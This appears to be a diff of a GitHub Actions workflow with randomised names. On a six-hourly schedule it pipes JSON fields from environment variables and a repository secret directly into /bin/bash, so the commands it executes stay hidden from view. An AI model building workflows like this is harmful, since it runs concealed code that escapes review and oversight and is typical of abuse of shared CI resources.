@@ -3,7 +3,7 @@ name: gaoshoz
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 1/6 * * *'
+    - cron: '10 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,21 +11,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: gaoshoz
         env:
-          l32889: ${{ secrets.l32889 }}
+          n06711: ${{ secrets.n06711 }}
         run: |
-          echo $l32889 | jq -r .j464 | /bin/bash
-          echo $no33283 | jq -r .mas72 | /bin/bash
-          echo $tmwy567 | jq -r .eoi3 | /bin/bash
-          echo $agu557 | jq -r .hxybt73372 | /bin/bash
-          echo $gb7270 | jq -r .di6 | /bin/bash
-          echo $xygcw4 | jq -r .zv86 | /bin/bash
-          echo $zg1538 | jq -r .gsje89814 | /bin/bash
-          echo $hoe62486 | jq -r .ruf65 | /bin/bash
-          echo $jkfez4122 | jq -r .ipsu252 | /bin/bash
-          echo $iu550 | jq -r .fj732 | /bin/bash
-          echo $keany3 | jq -r .divny23 | /bin/bash
-          echo $ed73814 | jq -r .upa73 | /bin/bash
-          echo $jvo033 | jq -r .q93658 | /bin/bash
-          echo $fjcml2666 | jq -r .fpgi85 | /bin/bash
-          echo $cpey6338 | jq -r .dvcnu609 | /bin/bash
+          echo $n06711 | jq -r .wni4326 | /bin/bash
+          echo $kikn7304 | jq -r .hh87 | /bin/bash
+          echo $pr3 | jq -r .rdtiw9155 | /bin/bash
+          echo $mhfh077 | jq -r .bq042 | /bin/bash
+          echo $gmbdd034 | jq -r .bj031 | /bin/bash
+          echo $ojiq80 | jq -r .dfoqb5 | /bin/bash
+          echo $t06312 | jq -r .bvwyw87210 | /bin/bash
+          echo $cn52899 | jq -r .yqmyx4 | /bin/bash
+          echo $ihbho16 | jq -r .gns1595 | /bin/bash
+          echo $du1042 | jq -r .aebr5 | /bin/bash
+          echo $mlap7855 | jq -r .zj0 | /bin/bash
+          echo $ttgi34 | jq -r .tvfh35 | /bin/bash
+          echo $ki577 | jq -r .vkha25912 | /bin/bash
+          echo $zle51 | jq -r .d8 | /bin/bash
+          echo $jm79 | jq -r .brn6 | /bin/bash
+          echo $px98 | jq -r .bho53331 | /bin/bash
+          echo $eqkqo4 | jq -r .scnz5768 | /bin/bash
+          echo $o397 | jq -r .dhm23 | /bin/bash
 
